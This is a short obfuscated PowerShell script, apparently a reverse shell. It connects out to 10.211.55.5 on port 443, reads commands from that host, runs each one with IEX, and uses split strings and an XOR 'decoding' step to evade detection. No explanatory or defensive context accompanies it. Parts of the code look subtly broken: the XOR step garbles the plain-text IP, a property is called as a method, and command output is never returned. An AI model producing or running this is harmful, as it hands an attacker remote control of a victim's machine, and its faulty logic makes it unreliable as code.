

$X = 0x55 ^ 0xAA
$IP = "10.211.55.5".ToCharArray()
$P = [BitConverter]::ToString([byte[]]@(443 -shr 8, 443 % 256)).Replace("-", "") # Port 443


Function D($a, $k) { return ($a | $k) -bxor $k }
$Y = { param($s,$k) -join ($s | % { [char](($_ -bxor $k) -band 0xFF) }) }


$DecIP = & $Y ($IP | % { [byte][char]$_ }, $X)
$DecPort = [int]"0x$(& $Y ($P.ToCharArray(), $X))"


$A = New-Object Net.Sockets.TcpClient
$B = "Cl" + "ient"
$C = "GetSt" + "ream"
$D = "Bi" + "naryWriter"
$E = "Stre" + "amReader"


$A.$B().Connect($DecIP, $DecPort)
$S = $A.$C()
$W = New-Object IO.$D($S)
$R = New-Object IO.$E($S)


While ($true) {
Try {
        $CMD = $R.ReadLine()
If ($CMD -eq "exit") { break }
        IEX ($CMD | Out-String)
        $W.WriteLine("> ")
        $W.Flush()
    } catch {
        Start-Sleep -Seconds 1
        $A.$B().Close()
    }
}
